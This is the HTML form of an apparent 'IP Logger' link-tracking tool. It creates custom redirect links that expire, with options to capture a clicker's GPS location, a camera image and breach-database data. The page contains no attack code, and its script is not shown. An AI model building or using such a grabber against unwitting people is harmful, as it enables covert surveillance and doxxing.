<!DOCTYPE html>
<html>

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width">
	<title>IP_logger</title>
	<link href="/static/home.css" rel="stylesheet" type="text/css" />


</head>
<h1>| IP Logger |</h1>



<div>
	<form method="post" action="/create/links">
		<label for="L_Link">Link</label>
    <input type="text" id="L_Link" name="L_Link" placeholder="The Link.."><br><br>

    <label for="L_Custom">Custom URL</label>
    <input type="text" id="L_Custom" name="L_CustomURL" placeholder="Your Custom URL.."><br><br>

    <label for="L_fUpload_name">File Name</label>
    <input disabled type="text" id="L_fUpload_name" name="L_fUpload_name" placeholder="File Name..">

    <input type="file"
       disabled
       id="avatar" name="avatar"
       accept="image/png, image/jpeg"/><br><br>

    <label for="L_Time">Time</label>
    <select id="L_Time" name="L_Time">
      <option value="1">1 day</option>
      <option value="3">3 days</option>
      <option value="5">5 days</option>
      <option value="10">10 days</option>
      <option value="25">25 days</option>
    </select><br><br>

    <label for="L_redirectTIME">Time befor redirect ms || default 1s</label>
    <input type="text" id="L_redirectTIME" name="L_redirectTIME" placeholder="Time befor redirect default" value="1000"/><br><br>
 
    |<input type="checkbox" id="L_cam" name="L_cam" disabled>
    <label for="L_cam">Cam Screen |</label>
    <input type="checkbox" id="L_gps" name="L_gps">
    <label for="L_cam">GPS |</label>
    <input type="checkbox" id="L_dehashed" name="L_dehashed" disabled>
    <label for="L_dehashed">DEHASHED |</label>
    <input type="checkbox" id="L_file" name="L_file" disabled>
    <label for="L_file">File |</label>
  
    <input type="submit" value="Submit">
  </form>
  </div>
    <p>By. Jeje720 & Leslato. (IP_logger Â© 2021).</p>
    <script src="script.js"></script>
  </body>
</html>
